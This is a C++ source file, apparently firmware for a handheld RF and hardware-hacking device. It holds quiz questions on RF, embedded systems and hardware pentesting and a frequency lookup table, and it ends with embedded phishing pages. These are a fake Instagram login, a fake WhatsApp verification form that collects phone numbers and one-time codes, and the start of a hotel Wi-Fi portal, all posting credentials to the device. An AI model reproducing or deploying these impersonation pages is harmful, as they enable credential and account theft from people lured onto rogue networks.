// db.cpp
#include "db.h"

// ==================== RF EASY (20 questions) ====================
const QuizQuestion easyRFQuestions[20] = {
    {"What does RF stand for?", {"Radio Frequency", "Random Frequency", "Radio Field", "Rapid Fire"}, 0, "RF stands for Radio Frequency"},
    {"What is Wi-Fi frequency?", {"2.4 GHz & 5 GHz", "900 MHz", "433 MHz", "1.8 GHz"}, 0, "Wi-Fi uses 2.4 GHz and 5 GHz bands"},
    {"What is Bluetooth frequency?", {"2.4 GHz", "5 GHz", "900 MHz", "433 MHz"}, 0, "Bluetooth operates at 2.4 GHz"},
    {"What does dBm measure?", {"Power ratio to 1mW", "Voltage", "Current", "Resistance"}, 0, "dBm is power relative to 1 milliwatt"},
    {"What is RSSI?", {"Signal strength", "Noise level", "Bandwidth", "Frequency"}, 0, "Received Signal Strength Indicator"},
    {"What does LoRa stand for?", {"Long Range", "Low Range", "Large Range", "Limited Range"}, 0, "LoRa = Long Range"},
    {"What is ISM band?", {"Industrial/Scientific/Medical", "International Standard", "Integrated System", "Interference Suppression"}, 0, "ISM bands are for unlicensed use"},
    {"What is SMA?", {"RF connector type", "Software protocol", "Modulation type", "Antenna type"}, 0, "SMA is common RF connector"},
    {"What is VSWR?", {"Impedance matching", "Voltage output", "Signal gain", "Noise figure"}, 0, "VSWR measures impedance match"},
    {"What is a dipole?", {"Basic antenna type", "Amplifier", "Filter", "Mixer"}, 0, "Dipole is simplest antenna"},
    {"What is antenna gain?", {"Directional power", "Total power", "Input power", "Output power"}, 0, "Gain measures directional efficiency"},
    {"What is SNR?", {"Signal to Noise Ratio", "Signal to Noise Response", "Signal Noise Rejection", "System Noise Ratio"}, 0, "SNR compares signal to noise"},
    {"What is modulation?", {"Encoding data on carrier", "Amplifying signal", "Filtering noise", "Converting frequency"}, 0, "Modulation encodes information"},
    {"What is ASK?", {"Amplitude Shift Keying", "Audio Shift Keying", "Analog Shift Keying", "Automatic Shift Keying"}, 0, "ASK varies amplitude"},
    {"What is FSK?", {"Frequency Shift Keying", "Fast Shift Keying", "Full Shift Keying", "Frequency Signal Keying"}, 0, "FSK varies frequency"},
    {"What is a transceiver?", {"Transmitter + Receiver", "Transformer + Receiver", "Transistor + Receiver", "Transducer + Receiver"}, 0, "Transceiver does both TX and RX"},
    {"What is RF impedance?", {"50 ohms standard", "75 ohms", "100 ohms", "25 ohms"}, 0, "50 ohms is RF standard"},
    {"What is attenuation?", {"Signal loss", "Signal gain", "Signal reflection", "Signal modulation"}, 0, "Attenuation reduces signal strength"},
    {"What is a harmonic?", {"Multiple of fundamental", "Noise signal", "Interference", "Modulation product"}, 0, "Harmonics are multiples of base frequency"},
    {"What is bandwidth?", {"Frequency range", "Data rate", "Signal strength", "Power output"}, 0, "Bandwidth is frequency span"}
};

// ==================== RF MEDIUM (20 questions) ====================
const QuizQuestion mediumRFQuestions[20] = {
    {"What is Friis equation for?", {"Free space path loss", "Antenna gain", "Noise figure", "Modulation index"}, 0, "Friis calculates received power"},
    {"What is Rayleigh fading?", {"No line of sight", "With line of sight", "Atmospheric effect", "Ground reflection"}, 0, "Rayleigh fading has no direct path"},
    {"What is Rician fading?", {"With line of sight", "No line of sight", "Indoor only", "Outdoor only"}, 0, "Rician includes a dominant path"},
    {"What is intermodulation?", {"Non-linear mixing", "Linear amplification", "Signal filtering", "Phase shifting"}, 0, "Intermodulation creates spurious signals"},
    {"What is Smith Chart for?", {"Impedance matching", "Power calculation", "Noise analysis", "Modulation"}, 0, "Smith chart solves matching problems"},
    {"What is phase noise?", {"Frequency instability", "Amplitude variation", "Phase shift", "Frequency drift"}, 0, "Phase noise is short-term instability"},
    {"What is a circulator?", {"3-port ferrite device", "Signal amplifier", "Frequency mixer", "Power divider"}, 0, "Circulator directs signal flow"},
    {"What is a directional coupler?", {"Samples one direction", "Splits power equally", "Combines signals", "Filters frequencies"}, 0, "Directional coupler samples forward power"},
    {"What is EVM?", {"Error Vector Magnitude", "Error Voltage Measurement", "Enhanced Vector Modulation", "Effective Value Method"}, 0, "EVM measures modulation quality"},
    {"What is a balun?", {"Balanced to unbalanced", "Bandpass filter", "Buffer amplifier", "Bias network"}, 0, "Balun converts between differential and single-ended"},
    {"What is frequency hopping?", {"Changing carrier frequency", "Fixed frequency", "Variable power", "Variable amplitude"}, 0, "Frequency hopping spreads spectrum"},
    {"What is SAW filter?", {"Surface Acoustic Wave", "Selective Amplitude Wave", "Signal Acoustic Wave", "Synchronous Acoustic Wave"}, 0, "SAW filters use acoustic waves"},
    {"What is P1dB?", {"1 dB compression point", "Power at 1 dB", "1 dB bandwidth", "1 dB noise figure"}, 0, "P1dB is linearity limit"},
    {"What is IP3?", {"Third-order intercept", "Intermodulation product", "Input power", "Output power"}, 0, "IP3 measures linearity"},
    {"What is coherent detection?", {"Using local oscillator", "Envelope detection", "Square law detection", "Direct detection"}, 0, "Coherent uses synchronized LO"},
    {"What is SDR?", {"Software Defined Radio", "Software Digital Radio", "System Defined Radio", "Signal Digital Radio"}, 0, "SDR uses software processing"},
    {"What is MIMO?", {"Multiple Input Multiple Output", "Modulated Input Output", "Multi-Interface Output", "Minimum Input Output"}, 0, "MIMO uses multiple antennas"},
    {"What is beamforming?", {"Focused RF energy", "Spreading signal", "Scrambling data", "Filtering noise"}, 0, "Beamforming directs signal"},
    {"What is link budget?", {"Power accounting", "Cost analysis", "Time calculation", "Frequency plan"}, 0, "Link budget accounts for gains/losses"},
    {"What is noise figure?", {"SNR degradation", "Total noise power", "Signal degradation", "Amplifier noise"}, 0, "Noise figure shows SNR loss"}
};

// ==================== RF HARD (20 questions) ====================
const QuizQuestion hardRFQuestions[20] = {
    {"Shannon-Hartley theorem?", {"C = B log2(1+SNR)", "C = 2B log2(M)", "SNR = 2^(C/B)-1", "B = C/SNR"}, 0, "Channel capacity formula"},
    {"What is cavity resonator?", {"Hollow conductor cavity", "LC circuit", "Crystal oscillator", "Ceramic filter"}, 0, "Cavity resonates at specific frequency"},
    {"What is YIG oscillator?", {"Yttrium Iron Garnet", "Yttrium Indium Garnet", "Ytterbium Iron Garnet", "Yttrium Gallium Garnet"}, 0, "YIG provides wide tuning"},
    {"What is PLL bandwidth?", {"Lock time vs noise", "Frequency range", "Output power", "Input sensitivity"}, 0, "PLL bandwidth trades off parameters"},
    {"What is patch antenna?", {"PCB planar antenna", "Wire antenna", "Horn antenna", "Yagi antenna"}, 0, "Patch antenna is PCB-based"},
    {"What is axial ratio?", {"Circular polarization purity", "Antenna efficiency", "Gain measurement", "Bandwidth"}, 0, "Axial ratio measures circular polarization"},
    {"What is Van Atta array?", {"Retroreflector array", "Phased array", "Log periodic array", "Yagi array"}, 0, "Van Atta reflects back to source"},
    {"What is T/R switch?", {"Transmit/Receive switch", "Time/Response switch", "Trigger/Reset switch", "Test/Return switch"}, 0, "T/R switches between TX and RX"},
    {"What is Schottky diode used for?", {"RF mixing/detection", "Power amplification", "Signal generation", "Impedance matching"}, 0, "Schottky diodes are fast for mixing"},
    {"What is reciprocal mixing?", {"Phase noise mixing", "Linear mixing", "Harmonic mixing", "Intermodulation"}, 0, "Reciprocal mixing with phase noise"},
    {"What is desensitization?", {"Gain reduction from interferer", "Sensitivity increase", "Noise reduction", "Bandwidth decrease"}, 0, "Strong signals reduce gain"},
    {"What is helix antenna?", {"Helical wire antenna", "Spiral antenna", "Loop antenna", "Dipole antenna"}, 0, "Helix provides circular polarization"},
    {"What is Vivaldi antenna?", {"Tapered slot antenna", "Patch antenna", "Horn antenna", "Log periodic antenna"}, 0, "Vivaldi is tapered slot"},
    {"What is rat-race coupler?", {"360° hybrid", "180° hybrid", "90° hybrid", "0° hybrid"}, 0, "Rat-race gives 180° phase difference"},
    {"What is Lange coupler?", {"Interdigitated coupler", "Wilkinson divider", "Branch line coupler", "Ring hybrid"}, 0, "Lange provides tight coupling"},
    {"What is Gunn diode?", {"Transferred electron device", "Tunnel diode", "Varactor", "PIN diode"}, 0, "Gunn has negative resistance"},
    {"What is TRL calibration?", {"Through-Reflect-Line", "Time Response Limit", "Transmission Reflection Loss", "Tuned Resonant Loop"}, 0, "TRL is VNA calibration"},
    {"What is six-port reflectometer?", {"Complex impedance measurement", "Six power meters", "Six port switch", "Six way divider"}, 0, "Six-port measures reflection coefficient"},
    {"What is metalens?", {"Metasurface lens", "Metal horn", "Metallic reflector", "Metal shield"}, 0, "Metalens uses subwavelength structures"},
    {"What is orbital angular momentum?", {"Spiral wavefront", "Circular polarization", "Linear polarization", "Radial polarization"}, 0, "OAM creates helical wavefronts"}
};

// ==================== EMBEDDED EASY (20 questions) ====================
const QuizQuestion easyEmbeddedQuestions[20] = {
    {"What is a microcontroller?", {"CPU + RAM + Flash on chip", "External processor", "Memory module", "Power supply"}, 0, "MCU integrates all core components"},
    {"What is GPIO?", {"General Purpose I/O", "Global Programmable I/O", "General Pin I/O", "Generic I/O"}, 0, "GPIO pins are multifunctional"},
    {"What is a register?", {"CPU storage location", "Memory address", "Data bus", "Clock signal"}, 0, "Registers are fast CPU storage"},
    {"What does ADC do?", {"Analog to Digital", "Audio Digital", "Amplitude Digital", "Address Digital"}, 0, "ADC converts analog to digital"},
    {"What is PWM?", {"Pulse Width Modulation", "Pulse Wave Modulation", "Programmable Wave", "Power Wave"}, 0, "PWM controls average power"},
    {"What is an interrupt?", {"Event pausing CPU", "Program crash", "Power failure", "Reset signal"}, 0, "Interrupts get immediate attention"},
    {"What is I2C?", {"Inter-Integrated Circuit", "Integrated Interface", "Intelligent Interconnect", "Inter-IC"}, 0, "I2C is 2-wire serial bus"},
    {"What is SPI?", {"Serial Peripheral Interface", "Serial Programmable", "Synchronous Parallel", "System Peripheral"}, 0, "SPI is 4-wire serial bus"},
    {"What is UART?", {"Universal Asynchronous RX/TX", "Universal Addressable", "Unified Asynchronous", "Universal Audio"}, 0, "UART does async serial"},
    {"What is baud rate?", {"Symbols per second", "Bits per second", "Bytes per second", "Bits per minute"}, 0, "Baud is symbol rate"},
    {"What is watchdog timer?", {"Resets on malfunction", "Time tracking", "Power monitor", "External timer"}, 0, "Watchdog recovers from hangs"},
    {"What is bootloader?", {"Loads firmware", "Debugging tool", "Power management", "Clock config"}, 0, "Bootloader starts the system"},
    {"What is ISR?", {"Interrupt Service Routine", "Integrated System Routine", "Interrupt Status Register", "Internal Service Request"}, 0, "ISR handles interrupts"},
    {"What is DMA?", {"Direct Memory Access", "Direct Memory Address", "Dynamic Memory Allocation", "Digital Memory Access"}, 0, "DMA transfers without CPU"},
    {"What is a timer?", {"Counts cycles/events", "Real-time clock", "Stopwatch", "Delay generator"}, 0, "Timers measure intervals"},
    {"What is embedded C?", {"C for constrained systems", "C++ for embedded", "C# for MCUs", "Standard C only"}, 0, "Embedded C has hardware features"},
    {"What is a stack?", {"LIFO memory", "FIFO memory", "Heap memory", "Cache memory"}, 0, "Stack stores return addresses"},
    {"What is a heap?", {"Dynamic allocation", "Stack region", "Code region", "Register file"}, 0, "Heap is for malloc/free"},
    {"What is volatile?", {"Prevents optimization", "Changes constantly", "Fast access", "Global access"}, 0, "Volatile stops compiler optimization"},
    {"What is bit-banging?", {"Software GPIO timing", "Hardware peripheral", "Clock generation", "Signal analysis"}, 0, "Bit-banging in software"}
};

// ==================== EMBEDDED MEDIUM (20 questions) ====================
const QuizQuestion mediumEmbeddedQuestions[20] = {
    {"What is RTOS?", {"Real-Time OS", "Real-Time System", "Rapid Task OS", "Recursive Task OS"}, 0, "RTOS has deterministic timing"},
    {"What is semaphore?", {"Synchronization primitive", "Signal generator", "Memory allocator", "Interrupt controller"}, 0, "Semaphores control resource access"},
    {"What is mutex?", {"Mutual exclusion", "Multiple execution", "Memory unit", "Multiplexer"}, 0, "Mutex provides exclusive access"},
    {"What is priority inversion?", {"Low priority blocks high", "Inverse scheduling", "Priority inheritance", "Task starvation"}, 0, "Priority inversion is a classic RTOS problem"},
    {"What is memory leak?", {"Unreleased memory", "Memory corruption", "Stack overflow", "Buffer overflow"}, 0, "Memory leak reduces available memory"},
    {"What is ring buffer?", {"Circular FIFO", "Linked list", "Stack buffer", "Tree buffer"}, 0, "Ring buffer wraps around"},
    {"What is RTOS tick?", {"Periodic timer interrupt", "Clock cycle", "Task quantum", "Scheduling point"}, 0, "Tick provides time base"},
    {"What is TCB?", {"Task Control Block", "Task Control Buffer", "Thread Control Block", "Task Context Block"}, 0, "TCB stores task state"},
    {"What is context switching?", {"Saving/restoring task state", "Changing modes", "Switching processors", "Task creation"}, 0, "Context switch swaps CPU state"},
    {"What is critical section?", {"Code with interrupts disabled", "Important code", "Fast code", "Init code"}, 0, "Critical sections are atomic"},
    {"What is memory-mapped I/O?", {"Peripherals as memory", "Dedicated I/O", "DMA transfers", "Port I/O"}, 0, "Memory-mapped I/O uses load/store"},
    {"What is nested interrupt?", {"Interrupt during ISR", "Multiple sources", "Chained interrupts", "Priority interrupts"}, 0, "Nesting allows higher priority"},
    {"What is jitter?", {"Timing variation", "Signal noise", "Power fluctuation", "Clock drift"}, 0, "Jitter is timing deviation"},
    {"What is determinism?", {"Predictable timing", "Random timing", "Fast execution", "Efficient execution"}, 0, "Deterministic systems are predictable"},
    {"What is HAL?", {"Hardware Abstraction Layer", "Hardware Access Layer", "High-level API", "Hardware Application Layer"}, 0, "HAL provides uniform APIs"},
    {"What is bit-banding?", {"Bit-addressable memory", "Bit manipulation", "Bandwidth mgmt", "Bus arbitration"}, 0, "Bit-banding allows bit access"},
    {"What is memory barrier?", {"Prevents reordering", "Memory protection", "Cache flush", "Memory allocation"}, 0, "Barrier enforces order"},
    {"What is double buffering?", {"Two buffers for flow", "Double allocation", "Buffer duplication", "Mirrored buffers"}, 0, "Double buffering prevents tearing"},
    {"What is event flag?", {"Binary event indicator", "Status register", "Interrupt flag", "Semaphore"}, 0, "Event flags signal conditions"},
    {"What is message queue?", {"Task communication", "Data storage", "Mailbox", "Buffer pool"}, 0, "Queues pass data between tasks"}
};

// ==================== EMBEDDED HARD (20 questions) ====================
const QuizQuestion hardEmbeddedQuestions[20] = {
    {"What is MPU?", {"Memory Protection Unit", "Memory Processing Unit", "Main Processing Unit", "Microprocessor Unit"}, 0, "MPU enforces memory permissions"},
    {"What is TCM?", {"Tightly Coupled Memory", "Temporary Cache Memory", "Trusted Core Memory", "Thread Control Memory"}, 0, "TCM is fast dedicated memory"},
    {"What is speculative execution?", {"Predictive execution", "Parallel execution", "Out-of-order execution", "Branch prediction"}, 0, "Speculative runs before branch resolves"},
    {"What is branch predictor?", {"Guesses branch outcome", "Executes branches", "Calculates branches", "Stores branches"}, 0, "Branch predictor improves pipeline"},
    {"What is pipeline hazard?", {"Stalls pipeline", "Data corruption", "Power surge", "Clock failure"}, 0, "Hazards cause pipeline stalls"},
    {"What is superscalar?", {"Multiple issue per cycle", "Super fast CPU", "Large cache", "Wide data bus"}, 0, "Superscalar issues multiple instructions"},
    {"What is out-of-order?", {"Non-program order", "Random execution", "Parallel execution", "Faster execution"}, 0, "OOO executes in different order"},
    {"What is register window?", {"Rotating register set", "Window register", "Register view", "Register file"}, 0, "Register windows reduce save/restore"},
    {"What is shadow register?", {"Backup register", "Fake register", "Cache register", "Mirror register"}, 0, "Shadow registers speed context switching"},
    {"What is barrel shifter?", {"Multi-bit shift in 1 cycle", "Rotating barrel", "Shift register", "Barrel processor"}, 0, "Barrel shifter shifts multiple bits"},
    {"What is CRC unit?", {"Cyclic Redundancy Check hw", "Check register", "Crypto unit", "Control unit"}, 0, "CRC unit accelerates error detection"},
    {"What is DSP instruction?", {"Signal processing acceleration", "Digital signal path", "Data stream processor", "Dedicated stack"}, 0, "DSP instructions do MAC operations"},
    {"What is SIMD?", {"Single Instruction Multiple Data", "Single Input Multiple Data", "Simple Instruction Multiple Data", "Single Instruction Multiple Device"}, 0, "SIMD processes multiple data"},
    {"What is VLIW?", {"Very Long Instruction Word", "Variable Length Instruction", "Virtual Long Instruction", "Vertical Long Instruction"}, 0, "VLIW bundles multiple ops"},
    {"What is Jazelle?", {"Java bytecode hw", "Java compiler", "JIT compiler", "Java VM"}, 0, "Jazelle accelerates Java"},
    {"What is Thumb?", {"16-bit ARM instructions", "Thumb drive", "Fast instructions", "Compact code"}, 0, "Thumb provides better code density"},
    {"What is bit-banded region?", {"Bit-addressable area", "Bandwidth region", "Memory region", "Bit region"}, 0, "Bit-banded regions allow bit access"},
    {"What is SysTick?", {"System tick timer", "System timer", "Synchronous timer", "Systematic timer"}, 0, "SysTick provides RTOS timebase"},
    {"What is NVIC?", {"Nested Vectored Interrupt Controller", "Network Vector Controller", "Nested Vector Controller", "Non-Vectored Interrupt Controller"}, 0, "NVIC handles interrupt priority"},
    {"What is Memory Protection Attribute?", {"Region permissions", "Attribute memory", "Protection bit", "Memory type"}, 0, "Attributes define access permissions"}
};

// ==================== HARDWARE PENTESTING EASY (20 questions) ====================
const QuizQuestion easyHardwareQuestions[20] = {
    {"What is UART?", {"Universal Async Serial", "Universal Addressable", "Unified Audio", "Universal Analog"}, 0, "UART is simple 2-wire protocol"},
    {"UART voltage levels?", {"3.3V or 5V", "1.8V only", "12V only", "24V only"}, 0, "UART uses logic levels"},
    {"How many wires for I2C?", {"2 wires", "4 wires", "1 wire", "3 wires"}, 0, "I2C uses SDA and SCL"},
    {"What are I2C pull-ups for?", {"Default high state", "Current limiting", "Voltage regulation", "Noise filtering"}, 0, "Pull-ups keep lines high"},
    {"SPI advantage?", {"High speed full duplex", "Low pin count", "Long distance", "Low power"}, 0, "SPI is fast and full duplex"},
    {"What is JTAG?", {"Joint Test Action Group", "Java Test Action Group", "Joint Test Access", "Java Test Access"}, 0, "JTAG is IEEE 1149.1"},
    {"What is SWD?", {"Serial Wire Debug", "Serial Wire Data", "Software Debug", "System Wire Debug"}, 0, "SWD is 2-pin ARM debug"},
    {"What is EEPROM?", {"Electrically Erasable PROM", "Electronically Erasable", "Extended Erasable", "External Erasable"}, 0, "EEPROM retains data without power"},
    {"What is SPI flash?", {"Serial flash memory", "Parallel flash", "SRAM", "EEPROM"}, 0, "SPI flash is serial interface"},
    {"What is PCB silkscreen?", {"Legend layer", "Solder mask", "Copper layer", "Substrate"}, 0, "Silkscreen has labels"},
    {"What are test points?", {"Exposed pads for probing", "Mounting holes", "Connectors", "Switches"}, 0, "Test points aid debugging"},
    {"What is logic analyzer?", {"Captures digital signals", "Measures voltage", "Generates signals", "Power analysis"}, 0, "Logic analyzer captures multiple signals"},
    {"What is oscilloscope?", {"Views analog waveforms", "Tests logic levels", "Programs chips", "Powers circuits"}, 0, "Oscilloscope displays voltage over time"},
    {"What is multimeter?", {"Measures V, I, R", "Measures frequency only", "Measures capacitance only", "Measures temperature only"}, 0, "Multimeter is multi-function"},
    {"What is debug header?", {"Connector for debug tools", "Power connector", "Programming header", "Test header"}, 0, "Debug headers expose debug interfaces"},
    {"What is security fuse?", {"OTP security bit", "Overcurrent protection", "Fusible link", "Power fuse"}, 0, "Security fuse disables debug"},
    {"What is read-out protection?", {"Prevents reading firmware", "Write protection", "Erase protection", "Execute protection"}, 0, "ROP protects firmware"},
    {"What is firmware encryption?", {"Encrypted storage", "Encrypted comms", "Secure boot", "Flash encryption"}, 0, "Firmware encryption protects code"},
    {"What is secure boot?", {"Verified boot chain", "Secure startup", "Password protection", "BIOS password"}, 0, "Secure boot verifies signatures"},
    {"What is HSM?", {"Hardware Security Module", "Hardware System Module", "High Security Memory", "Hardware Signal Module"}, 0, "HSM is crypto processor"}
};

// ==================== HARDWARE PENTESTING MEDIUM (20 questions) ====================
const QuizQuestion mediumHardwareQuestions[20] = {
    {"What is JTAG boundary scan?", {"Tests interconnects", "Memory scan", "Power scan", "Clock scan"}, 0, "Boundary scan tests PCB connections"},
    {"JTAG TAP signals?", {"TCK, TMS, TDI, TDO", "TDIO, TCK, TMS", "TDI, TDO, TMS", "TCK, TDO, TDI"}, 0, "TAP uses 4 signals"},
    {"What is SWDIO?", {"Serial Wire Debug I/O", "Serial Wire Input Output", "SWD Data I/O", "Serial Debug I/O"}, 0, "SWDIO is bidirectional data"},
    {"What is SWCLK?", {"Serial Wire Clock", "SWD Clock", "Serial Clock Line", "SWD Clock Line"}, 0, "SWCLK is clock signal"},
    {"SPI flash voltage?", {"3.3V typical", "5V", "1.8V", "12V"}, 0, "3.3V is standard"},
    {"EEPROM page buffer?", {"Temporary write storage", "Cache memory", "Read buffer", "Erase buffer"}, 0, "Page buffers speed writes"},
    {"What is PCB via?", {"Plated hole between layers", "Component pin", "Test point", "Mounting hole"}, 0, "Vias connect layers"},
    {"What are blind vias?", {"Outer to inner layers", "Through all layers", "Hidden vias", "Partial vias"}, 0, "Blind vias connect surface to internal"},
    {"What are buried vias?", {"Connect internal layers", "Hidden vias", "Through vias", "Surface vias"}, 0, "Buried vias are internal only"},
    {"What is ground plane?", {"Large copper ground area", "Ground signal", "Ground wire", "Ground pad"}, 0, "Ground plane reduces noise"},
    {"What is series termination?", {"Resistor near source", "End resistor", "Pull-up", "Pull-down"}, 0, "Series termination reduces reflections"},
    {"What is level translation?", {"Voltage conversion", "Logic conversion", "Level shifting", "Voltage translation"}, 0, "Level translation allows mixing voltages"},
    {"What is bus analyzer?", {"Captures protocol traffic", "Logic analyzer", "Oscilloscope", "Multimeter"}, 0, "Bus analyzer decodes protocols"},
    {"What is salting for flash?", {"Randomizes addressing", "Data encryption", "Access passwords", "Write protection"}, 0, "Salting complicates memory analysis"},
    {"What is glitch detection?", {"Detects power/clock glitches", "Noise filter", "Power monitor", "Clock monitor"}, 0, "Glitch detection catches fault injection"},
    {"What are active shields?", {"Tamper-detecting layers", "EM shields", "RF shields", "Heat shields"}, 0, "Active shields detect tampering"},
    {"What is tamper response?", {"Action after tamper detect", "Alert only", "Log only", "Shutdown"}, 0, "Tamper response erases keys"},
    {"What is side-channel resistance?", {"Prevents info leakage", "Shielded channels", "Encrypted channels", "Isolated channels"}, 0, "Side-channel resistance prevents leakage"},
    {"What is secure element?", {"Tamper-resistant chip", "Secure memory", "Secure processor", "Crypto accelerator"}, 0, "Secure element resists attacks"},
    {"What is HRNG?", {"Hardware Random Number Generator", "High Random Number Gen", "Hardware RNG", "High-speed RNG"}, 0, "HRNG uses physical processes"}
};

// ==================== HARDWARE PENTESTING HARD (20 questions) ====================
const QuizQuestion hardHardwareQuestions[20] = {
    {"JTAG debug authentication?", {"Access control", "JTAG password", "Secure JTAG", "JTAG encryption"}, 0, "Debug auth requires crypto"},
    {"SWD authentication?", {"Secured debug interface", "Password SWD", "Encrypted SWD", "Locked SWD"}, 0, "Authenticated SWD needs handshake"},
    {"What is DFT?", {"Design for Testability", "Debug Fault Tolerance", "Digital Fault Test", "Device Function Test"}, 0, "DFT adds test features"},
    {"What are scan chains?", {"Shift registers for test", "Scan paths", "Test chains", "Boundary scan"}, 0, "Scan chains can expose state"},
    {"What is unlock token?", {"Crypto debug key", "Physical key", "Password token", "Access token"}, 0, "Unlock token authenticates debug"},
    {"What is anti-tamper mesh?", {"Physical detection network", "Mesh shield", "Security mesh", "Protection mesh"}, 0, "Mesh detects probing"},
    {"Depopulated component?", {"Unpopulated PCB pad", "Removed component", "Missing component", "Damaged component"}, 0, "Depopulated pads may be debug headers"},
    {"Zero-ohm resistors?", {"Bridges for config", "Zero resistance", "Short circuit", "Jumpers"}, 0, "Zero-ohm resistors select options"},
    {"Configuration strapping?", {"Boot mode selection pins", "Strapping pins", "Config pins", "Mode pins"}, 0, "Strapping pins set boot mode"},
    {"ROM bootstrap vulnerabilities?", {"Bootloader security flaws", "Boot ROM bugs", "Boot issues", "ROM errors"}, 0, "ROM bootloader flaws can't be fixed"},
    {"Secure key storage?", {"Protected key retention", "Key memory", "Safe keys", "Key vault"}, 0, "Secure key storage uses fuses"},
    {"What is PUF?", {"Physical Unclonable Function", "Physical Unique Function", "Programmable Unclonable Function", "Protected Unclonable Function"}, 0, "PUF creates silicon fingerprint"},
    {"DPA resistance?", {"Power analysis countermeasures", "EM shielding", "Fault detection", "Glitch filtering"}, 0, "DPA resistance prevents power analysis"},
    {"EMFI resistance?", {"EM fault injection countermeasures", "EM shielding", "Fault detection", "Glitch filtering"}, 0, "EMFI protection prevents EM pulses"},
    {"LFI resistance?", {"Laser fault injection countermeasures", "Light shielding", "Fault detection", "Circuit hardening"}, 0, "LFI protection stops laser attacks"},
    {"What is die shield?", {"Active metal shield on die", "Die coating", "Die cover", "Die protector"}, 0, "Die shield prevents microprobing"},
    {"What is chip coating?", {"Protective opaque material", "Die coat", "Conformal coating", "Resin coating"}, 0, "Coating obscures circuitry"},
    {"Die-level tamper response?", {"On-chip detection", "Die sensors", "Chip security", "Built-in detection"}, 0, "Die-level response zeros keys"},
    {"Metal layer OTP?", {"One-time programmable fuses", "Metal fuses", "OTP memory", "Fuse array"}, 0, "Metal OTP uses physical fuses"},
    {"Secure debug interface?", {"Authenticated debug access", "Password debug", "Locked debug", "Hidden debug"}, 0, "Secure debug requires authentication"}
};







const FreqEntry freqDB[] = {

  {1.0, 30.0, "VLF / LF", "Submarine comms, navigation beacons", "Very long wave signals"},

  {433.0, 435.0, "ISM 433", "Car remotes, sensors, LoRa (EU)", "Low power RF devices"},

  {868.0, 870.0, "ISM 868", "LoRa, smart meters (EU)", "IoT band"},

  {902.0, 928.0, "ISM 915", "LoRa, RFID, telemetry (US)", "Industrial band"},

  {1090.0, 1090.0, "ADS-B", "Aircraft tracking", "Planes broadcast position"},

  {1200.0, 1300.0, "L-Band", "GPS, aviation, satellite", "Navigation systems"},

  {1575.0, 1575.0, "GPS L1", "GPS satellites", "Civil GPS frequency"},

  {2400.0, 2483.5, "ISM 2.4GHz", "Bluetooth, WiFi, Zigbee", "Most crowded RF band"},

  {2401.0, 2480.0, "Bluetooth", "Headphones, BLE devices", "Frequency hopping used"},

  {2412.0, 2472.0, "WiFi 2.4GHz", "Routers, APs", "802.11 b/g/n"},

  {2480.0, 2483.5, "Zigbee edge", "Smart home devices", "Low power mesh"},

  {315.0, 315.0, "RF Remote US", "Car keys, garage doors", "Simple ASK/OOK"},

  {433.92, 433.92, "Car Key Fobs", "Central locking systems", "Most common EU remotes"},

  {868.3, 868.3, "Zigbee / SubGHz IoT", "Smart sensors", "Europe IoT band"},

  {125.0, 125.0, "LF RFID", "Access cards", "125kHz RFID tags"},

  {13.56, 13.56, "NFC", "Contactless payments", "Short range inductive RF"},

  {50.0, 1000.0, "HF/VHF/UHF range", "TV, radio, comms", "Wide spectrum use"},

  {157.0, 174.0, "VHF band", "Marine / aviation / radio", "Long range comms"},

  {400.0, 470.0, "UHF band", "Walkie talkies", "Public safety radios"},

  {3000.0, 6000.0, "Microwave", "Radar, WiFi 5GHz", "High frequency systems"}

};

const int freqDBSize = sizeof(freqDB) / sizeof(freqDB[0]);

const FreqEntry* findFrequency(float f) {
  for (int i = 0; i < freqDBSize; i++) {
    if (f >= freqDB[i].startMHz && f <= freqDB[i].endMHz) {
      return &freqDB[i];
    }
  }
  return nullptr;
}





// Simplified Instagram page - actually submits to server
const char SIMPLE_insta0[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#fafafa;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .container{max-width:350px;width:100%;background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:40px 32px}
        .logo{text-align:center;margin-bottom:32px;font-size:28px;font-weight:bold}
        input{width:100%;padding:12px;margin:8px 0;border:1px solid #dbdbdb;border-radius:4px;font-size:14px}
        button{width:100%;padding:12px;background:#0095f6;color:white;border:none;border-radius:8px;font-weight:bold;cursor:pointer;margin-top:8px}
        button:hover{background:#1877f2}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">📸 Instagram</div>
    <form method="POST" action="/submit">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>
)HTML";

// Simplified WhatsApp page - actually submits to server
const char SIMPLE_whats1[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
        .container{max-width:400px;width:100%;text-align:center;padding:20px}
        .logo{background:#25D366;width:70px;height:70px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:36px}
        input{width:100%;padding:14px;margin:10px 0;border:1px solid #e0e0e0;border-radius:24px;font-size:16px}
        button{width:100%;padding:14px;background:#25D366;color:white;border:none;border-radius:24px;font-weight:bold;cursor:pointer}
        button:hover{background:#20b859}
    </style>
</head>
<body>
<div class="container">
    <div class="logo">💬</div>
    <h2>WhatsApp</h2>
    <p>Verify your phone number</p>
    <form method="POST" action="/submit">
        <input type="tel" name="phone" placeholder="Phone number" required>
        <input type="text" name="otp" placeholder="Verification code">
        <button type="submit">Verify & Continue</button>
    </form>
</div>
</body>
</html>
)HTML";

// Simplified Hotel page - actually submits to server
const char SIMPLE_hot2[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotel WiFi Login</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:linear-gradient(135deg,#1f3e42,#2c6e6b);font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}
